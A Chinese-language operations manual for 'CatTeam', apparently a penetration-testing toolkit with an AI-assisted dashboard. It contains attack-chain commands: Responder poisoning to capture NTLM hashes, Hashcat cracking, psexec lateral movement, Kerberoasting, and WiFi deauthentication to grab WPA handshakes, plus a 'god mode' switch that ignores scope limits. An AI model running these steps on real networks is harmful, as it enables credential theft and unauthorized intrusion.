# 🐱 CatTeam 作战手册 (V9.3 Electro-Phantom)

本手册按**实战场景**组织，重点介绍 **G.I. 智能大屏** 的核心管线。

> **V9.3 声明**: CLAW 已回归态势感知指挥中枢定位。武器自动化已在 The Final Purge 中彻底移除，攻击执行交给 Kali 原生工具 + 人工操作。TUI 终端降级为次要的回退手段。

---

## 🖥️ G.I. 智能大屏操作术 (V9.3 Commander's HUD)

### 启动服务

```bash
# 后端 (FastAPI MCP 桥接层) — 端口 8000
cd ~/CatTeam && uvicorn backend.main:app --reload --port 8000

# 前端 (React G.I. 大屏) — 端口 5173
cd ~/CatTeam/frontend && npx vite --port 5173
```

浏览器打开 `http://localhost:5173` 即可进入单兵全维度指挥大屏。

### V9.3 界面布局与管线节点 (The "HUD" Layout)

左侧的 `Activity Bar` 导航条**并未被删除，而是被深度重构为 V9 核心中枢**。当前系统完全服从上、中、右的三段军事化布局：

| 区域 | 真实模块 | 说明 |
|---|---|---|
| **领航域 (Top Header)** | 全局战役管线 (CampaignPipeline) 4 阶段发光条 | 战区锚定 → 服务指纹 → 威胁研判 → 战报输出。 |
| **情境沙盒 (Center Pane)**| 【资产大表 AssetTable】与【战役看板 TheaterKanban】 | ALFA 与 NMAP 双重雷达探明的资产。 |
| **全局锁定网 (Center Top)** | 全局多选准星 (Global Multi-Select Reticle) | 跨 IP/BSSID 多维阵列框选靶标并持续追踪。 |
| **RF 射频雷达 (Left Tab)** | RadioRadarPanel (Sparkline + Ghosting + 探针状态灯) | WiFi AP 实时态势 + RSSI 折线 + 残影动画。 |
| **MCP 监控台 (Left Tab)** | OUTPUT LOGS — MCP 工具调用监控 | AI Copilot 的 TOOL_CALL_START/RESULT 实时透明化。 |
| **副官参谋 (Right Pane)** | LYNX Copilot (Gemini 3.1 Pro/Flash + 自动降级) | 基于雷达图景的战术分析指导 + Mission Briefing。 |

### [➕超纲新增] V9.0 环境壁垒 (Theater Manager)
在启动 Web 面板后，**强烈建议第一步在顶部 Header 选择/新建 `战区 (Theater)`**。
所有扫描仪、资产入库、AI 对话上下文，**均被 SQLite 物理隔离在您选定的战区内**，横跨星巴克与内网时绝不会出现数据串流污染！

---

## 命令行回退操作流程图 (Fallback CLI Flow)

```
                        ┌─────────┐
                        │  开始    │
                        └────┬────┘
                             │
                    需要换 IP？
                   ┌── 是 ──┤── 否 ──┐
                   │                  │
              make run          make fast
                   │                  │
                   └────────┬─────────┘
                            │
              等待 ~2 分钟 (嗅探+扫描+解析)
                            │
                    ┌───────┴───────┐
                    │ 资产数据就绪    │
                    │ live_assets.json│
                    └───────┬───────┘
                            │
              ┌─────────────┼─────────────┐
              │             │             │
         Web审计?      精准打击?     内网投毒?
         make web    python3 03-*   make phantom
              │                          │
              │                    等待捕获 Hash
              │                          │
              │                    make crack
              │                          │
              │                    make lateral
              │                          │
              └──────────┬───────────────┘
                         │
                    make report   ← 生成渗透测试战报
                    make diff     ← 对比上次扫描变化
                         │
                    新一轮？
              make clean → 回到开始
```

---

## 备用场景零：启动交互式 CLI 控制台

如果因网络或环境问题无法访问 Web 端大屏，可降级启动原生 TUI 控制台：

```bash
cd ~/CatTeam
make console
```

控制台提供编号菜单、实时状态显示、前置条件自动校验。细节见下方各场景。

---

## 场景一：首次使用

```bash
cd ~/CatTeam

# 1. 按需编辑配置
nano config.sh          # 改网卡/超时/端口
nano blacklist.txt      # 添加禁飞区 IP

# 2. 一键跑通（自动预检权限/工具/网络）
make run
```

---

## 场景二：日常侦察（最常用）

```bash
make fast                 # 被动嗅探 (默认 7 端口)
make fast PROFILE=iot     # IoT 专用 11 端口
make fast PROFILE=full    # 全面扫描 30 端口

# 主动探活 (L3 跨网段)
make fast RECON_MODE=active ACTIVE_CIDR=10.140.0.0/24
```

完成后数据在 `CatTeam_Loot/latest/` 下：
- `targets.txt` — 目标 IP 列表
- `nmap_results.*` — 扫描报告
- `live_assets.json` — 结构化资产清单

---

## 场景三：Web 资产审计

侦察链完成后，进一步识别 Web 服务：

```bash
# 纯 Python 版 (推荐，无额外依赖)
make web

# 或 Kali VM 内 httpx
make audit
```

查看结果：
```bash
cat CatTeam_Loot/latest/web_fingerprints.txt
```

---

## 场景四：投毒 → 破解 → 横向 (完整攻击链)

这是 CatTeam 的高级功能，需要按顺序执行三步：

### Step 1: 布下投毒陷阱

```bash
# 启动 Responder 监听 (后台运行，Mac 原生)
make phantom

# 实时查看捕获情况
tail -f CatTeam_Loot/latest/responder_raw.log

# 等足够久，收集到 Hash 后：
make phantom-stop
```

> ⏱ 建议至少挂 10-30 分钟。有人访问共享/打印机时就能抓到 Hash。

### Step 2: 算力破解

```bash
# 自动读取 captured_hash.txt，用宿主机 GPU 跑 Hashcat
make crack
```

> 前提：`brew install hashcat` + 准备 rockyou.txt 字典

### Step 3: 横向移动

```bash
# 自动加载破解出的凭据，尝试 SMB 认证
make lateral

# 或通过环境变量指定凭据 (OPSEC安全，不进 history)
LATERAL_USER=admin LATERAL_PASS='P@ss' sudo -E ./06-psexec.sh
```

> ⚠️ **绝不通过命令行参数传递密码**，会暴露在 history 和 ps aux 中。

查看战果：
```bash
cat CatTeam_Loot/latest/lateral_results.txt
```

### Step 4: 生成渗透测试战报

```bash
make report
```

自动汇总所有 Loot 数据，生成 `CatTeam_Report.md`（端口热力榜 + 凭据泄露 + 风险评级）。

---

## 场景五：资产变化检测 (SQL 引擎)

需要至少两次扫描记录。v5.0 优先使用 SQLite SQL EXCEPT 查询：

```bash
make diff
```

输出：新增主机 / 消失主机 / 端口变化。结果保存到 `asset_diff.json`。

> v5.0 自动使用 `claw.db`；若数据库不存在则 fallback JSON 对比。

---

## 场景六：精准打击特定目标

```bash
python3 ./03-exploit-76.py
```

---

## 场景七：AI 战术分析（v5.0 新增）

在 TUI 控制台中选择 `13) AI 战术分析` 或直接运行：

```bash
# AI 自动读取 SQLite 扫描数据，调用 Gemini Flash 分析
python3 ./16-ai-analyze.py

# 实战模式 (IP 自动脱敏)
CLAW_OPSEC=live python3 ./16-ai-analyze.py
```

---

## 场景八：问 Lynx 对话（v5.0 新增）

在 TUI 中选择 `14) 问 Lynx` 或直接运行：

```bash
python3 ./17-ask-lynx.py
```

自动携带扫描上下文，支持多轮对话。输入 `q` 退出。

---

## 场景九：环境隔离与上帝模式 (v5.0.1 新增)

在真实的内网多靶场切换时，您可以使用 TUI 的快捷键：

1. **`16) 切换环境` (数据隔离)**
   - 切换当前作战环境（如 `default` 切到 `AscottLot`）。所有后续扫描数据只会写入该环境标签，同时 AI 分析也会严格过滤出当前环境的资产，避免不同靶场的数据“乱炖”。
2. **`r) 上帝模式` (ROE 旁路)**
   - 按下 `r` 键，可以动态切换交战规则 (ROE) 的严格模式。
   - **`[ ON ]`**: 警告模式！系统忽略 `scope.txt` 和一切授权子网配置，原封不动地全量探活。适合靶场或者完全授权的网段。
   - **`[ OFF ]`**: 安全模式！(默认) 所有截获或配置的 IP 都会经过网段黑白名单交叉验证，拦截一切越界探测。
3. **`s) 陷阱监控` (Responder 状态查询)**
   - 执行 `6) 投毒陷阱` 后，随时按 `s` 查看 Responder 是否仍在后台监听、最近 15 条嗅探日志、以及已捕获的 NTLM Hash 战利品。

---

## 场景十：清空重来

```bash
make clean     # 删除所有历史任务 + 销毁容器
make fast      # 重新开始
```

---

## 场景十一：排查问题

```bash
make status                                    # 战区总览
cat CatTeam_Loot/latest/catteam.log           # 统一日志
cat CatTeam_Loot/latest/nmap_run.log          # Nmap 日志
ssh kali@<KALI_VM_IP>                          # SSH 进入 Kali VM
cat backend.log                                # 后端运行日志
```

---

## 📦 模块使用前置条件

| 模块 | 需要先完成 | 额外依赖 |
|---|---|---|
| `00-armory` | 无 | sudo |
| `01-recon` | 无 | sudo, tcpdump |
| `02-probe` | 01 的 targets.txt | Kali VM + Nmap |
| `02.5-parse` | 02 的 nmap_results.xml | Python3 |
| `03-audit` | 02.5 的 live_assets.json | Kali VM + httpx |
| `03-audit-web` | 02.5 的 live_assets.json | Python3 |
| `04-phantom` | 无 (独立运行) | Responder + scapy |
| `05-cracker` | 04 的 captured_hash.txt | Hashcat + rockyou.txt |
| `06-psexec` | 02.5 的 live_assets.json + 凭据 | Kali VM + Impacket |
| `07-report` | 任意 Loot 数据 | Python3 |
| `08-diff` | 至少两次扫描记录 | Python3, claw.db (优先) |
| `09-loot` | 06 的 lateral_results.txt + 凭据 | Kali VM + Impacket + `--confirm` |
| `10-kerberoast` | 域用户凭据 + 域控 IP | Kali VM + Impacket + BloodHound |
| `16-ai-analyze` | claw.db (02.5 生成) | Python3, curl, Gemini API Key |
| `17-ask-lynx` | 无 (可选 claw.db) | Python3, curl, Gemini API Key |
| `18-ai-bloodhound` | BloodHound JSON/ZIP (`10-kerberoast` 生成) | Python3, Gemini API Key |
| `23-hp-proxy-unlocker` | 目标 IP | Python3 |
| **Web Dashboard (后端)** | 无 | Python3, uvicorn, FastAPI |
| **Web Dashboard (前端)** | 后端运行中 | Node.js, npm |
| `agent_mcp.py` | claw.db + Gemini API Key | Python3, MCP Server |
| `mcp_armory_server.py` | claw.db | Python3 |
| `make toolbox` | Kali VM 运行中 | Kali VM 原生工具 |
| `make firmware` | 固件 .bin 文件 | Python3 |

---

## ⚠️ 常见问题

| 问题 | 解决 |
|---|---|
| `make run` 卡在换脸 | `make fast` 跳过 |
| 飞行前预检失败 | 确认 Kali VM 已启动且 SSH 可达 |
| "弹药库为空" | 延长 `RECON_TIME` 或确保网络有广播 |
| 扫的端口太少 | `PROFILE=full` |
| 误扫了不该扫的 | 编辑 `blacklist.txt` |
| Hashcat 找不到字典 | 更新 `config.sh` 中 `WORDLIST` 路径 |
| 04 模块在 Mac 上抓不到包 | 检查 SIP 是否禁用了原始套接字 |
| 06 凭据从哪来 | 自动从 05 的 cracked_passwords.txt 加载 |

---

## 场景十二：ALFA 无线射频侦察 (Monitor Mode)

### 架构概览

```
┌─────────────────── MacBook Air (宿主机) ────────────────────┐
│                                                              │
│  [后端] uvicorn backend.main:app :8000                       │
│  [前端] npx vite :5173 → 浏览器大屏                          │
│                    ↑ HTTP POST (wifi 遥测)                   │
│  ┌──────────────── Kali Linux 虚拟机 ──────────────────┐     │
│  │                                                      │     │
│  │  终端 1: airodump-ng wlan0mon (占满屏幕, 不能退出)   │     │
│  │          ↓ 每3秒刷新 CSV 文件                        │     │
│  │  终端 2: claw_wifi_sensor.py (读CSV → POST到宿主机)  │     │
│  │                                                      │     │
│  │  [USB 直通] ALFA 网卡 ──→ wlan0 ──→ wlan0mon         │     │
│  └──────────────────────────────────────────────────────┘     │
└──────────────────────────────────────────────────────────────┘
```

**为什么需要两个终端窗口？**

`airodump-ng` 是一个**全屏实时刷新**的扫描程序，启动后会独占整个终端，持续显示周围的 AP 列表。它不会自动退出，也无法在同一个终端里再运行其他命令。因此必须打开**第二个终端窗口**来运行 `claw_wifi_sensor.py` 探针脚本，由它读取 `airodump-ng` 写出的 CSV 文件并把数据发送给宿主机上的后端服务。

### 前置条件

| 条件 | 说明 |
|---|---|
| Kali 虚拟机 | 已在 MacBook Air 上启动 (VMware / UTM / Parallels) |
| ALFA 网卡 | 已通过 USB 直通 (USB Passthrough) 挂载到 Kali 虚拟机 |
| Mac 后端服务 | `uvicorn backend.main:app --port 8000` 已在宿主机运行 |
| Mac 前端服务 | `npx vite --port 5173` 已在宿主机运行 |
| 探针脚本 | ✅ `claw_wifi_sensor.py` 已部署到 Kali 虚拟机 |
| ALFA 网卡 | ✅ RTL8812AU USB 网卡已购入，直通至 Kali VM |
| Kali 武器库 | ✅ aircrack-ng / nmap / nuclei / Impacket 等已预装 |

### 准备工作：更新探针脚本 (仅版本更新时需要)

`claw_wifi_sensor.py` 位于宿主机的 `~/CatTeam/CatTeam_Loot/claw_wifi_sensor.py`。探针已部署就绪，仅在脚本更新时需要重新传入：

```bash
# 在 Mac 宿主机上执行，将更新后的探针脚本传入 Kali
scp ~/CatTeam/CatTeam_Loot/claw_wifi_sensor.py kali@<KALI_VM_IP>:~/claw_wifi_sensor.py
```

> 💡 如果不知道 Kali 虚拟机的 IP，可以在 Kali 虚拟机的终端中运行 `ip addr` 或 `hostname -I` 查看。

### Step 1: 在 Kali 虚拟机中开启监听模式

在 Kali 虚拟机的**第一个终端窗口**中：

```bash
# 杀死可能干扰 Monitor Mode 的后台服务 (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# 将 wlan0 切换至 Monitor Mode
# 网卡名可能是 wlan0 或 wlan1，用 iwconfig 确认
sudo airmon-ng start wlan0
# 成功后网卡名变为 wlan0mon
```

> ⚠️ 执行 `check kill` 会断开 Kali 虚拟机的 WiFi。如果您通过 SSH 连接 Kali，请确保 SSH 走的是**虚拟机的 NAT/桥接网络**而非 WiFi，否则连接会丢失。如果直接在虚拟机窗口中操作则无此问题。

### Step 2: 启动底层雷达扫描 (Airodump-ng)

仍然在**第一个终端窗口**中：

```bash
# --write-interval 3: 每 3 秒将捕获结果刷新到 CSV 文件
# --output-format csv: 输出为纯文本 CSV（供探针脚本解析）
# -w /tmp/target_recon: 输出文件前缀（实际生成 /tmp/target_recon-01.csv）
sudo airodump-ng wlan0mon --write-interval 3 --output-format csv -w /tmp/target_recon
```

此时屏幕会被 airodump-ng 的实时 AP 列表**完全占满**。这是正常的。
**保持此窗口不动，不要 Ctrl+C。**

### Step 3: 打开第二个终端, 启动探针回传

因为 airodump-ng 占满了第一个终端，您需要：
- 在 Kali 虚拟机桌面中**右键打开新的终端窗口**，或者
- 从 Mac 宿主机再 SSH 一个新会话到 Kali 虚拟机

在**第二个终端窗口**中启动探针：

```bash
# 探针负责：读取 airodump 生成的 CSV → 解析 AP 信息 → POST 到 Mac 后端
python3 ~/claw_wifi_sensor.py \
    --csv /tmp/target_recon-01.csv \
    --mothership http://<MAC_HOST_IP>:8000 \
    --interval 3
```

> 💡 `<MAC_HOST_IP>` 是宿主机的 IP 地址。
> - 如果 Kali 虚拟机用 **桥接模式 (Bridged)**：填 Mac 在局域网中的 IP（如 `192.168.1.10`）
> - 如果用 **NAT 模式**：填虚拟机网关 IP（通常是 `10.0.2.2` 或 `192.168.x.1`，具体看虚拟化软件配置）

启动成功后，探针会每 3 秒循环打印类似以下日志：
```
[+] Radar push successful: 12 nodes synchronized.
```

### Step 4: 在 Mac 浏览器上查看大屏

1. 打开浏览器访问 `http://localhost:5173`
2. 点击左侧 Activity Bar 的 **RF** (射频频段) 标签
3. `RadioRadarPanel` 面板应开始每 3 秒刷新真实 AP 信号，含 RSSI Sparkline 折线图
4. 点击任意 AP 行的复选框可将 BSSID 加入全局靶标池
5. 信号消失 >10s 的 AP 将显示半透明残影 (Ghosting)，>5min 移入底部历史折叠区

### Step 5: 使用 Wireshark 深度分析 (可选)

```bash
# 在 Kali 虚拟机中直接启动 Wireshark GUI
wireshark &

# 或用 tshark 命令行抓取特定 BSSID 的握手包
# 需要在第三个终端窗口（或在 airodump 窗口 Ctrl+C 后重新定向）
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w /tmp/handshake wlan0mon

# 使用 aireplay-ng 发射 Deauth 强制客户端重连以获取握手包
sudo aireplay-ng -0 10 -a <TARGET_BSSID> wlan0mon

# 验证是否成功捕获 WPA 握手
sudo aircrack-ng /tmp/handshake-01.cap
```

### Step 6: 关闭流程

```bash
# 按顺序关闭：
# 1. 在第二个终端 Ctrl+C 停止探针 (claw_wifi_sensor.py)
# 2. 在第一个终端 Ctrl+C 停止 airodump-ng
# 3. 恢复网卡为正常模式
sudo airmon-ng stop wlan0mon

# 4. 重启网络服务（恢复 Kali 的普通 WiFi）
sudo systemctl start NetworkManager
```

> ⚠️ **重要**：探针停止后，大屏 RF 面板的活跃 AP 将在 5 分钟内逐渐转入「历史残影」折叠区 (AP Ghosting)。所有数据永久保留在 SQLite `wifi_nodes` 表中，可随时通过 AI 查询历史。

---

## 场景十三：Mission Briefing 战术意图下发 (V9.3 新增)

在 AI Copilot 面板顶部，可以看到 **MISSION BRIEFING** 区域：

1. **点击预制标签 (Chips)**：6 个一键意图标签（如「全域 WiFi 态势评估」「弱加密 AP 识别」等），点击即填充到输入框
2. **自定义指令**：在输入框编写任意战术意图，点击「全域推送」
3. **推送反馈**：按钮变绿显示「已下发」，2 秒后恢复
4. **活跃指示**：下发成功后标题变为 `ACTIVE BRIEFING` + 绿色脉冲呼吸灯

推送的战略意图会被注入到 LYNX AI 的 System Prompt 中，所有后续分析和建议都将自动与该意图对齐。
同时，Kali 探针每次上报数据时也会收到最新的指挥官意图回执。

> 💡 **移动端**：手机浏览器访问 `http://<宿主机IP>:5173`，底部导航栏切换 RF 雷达 / AI 对话 / 任务意图 / 系统状态四个视图，支持 5G 热点外勤作业。

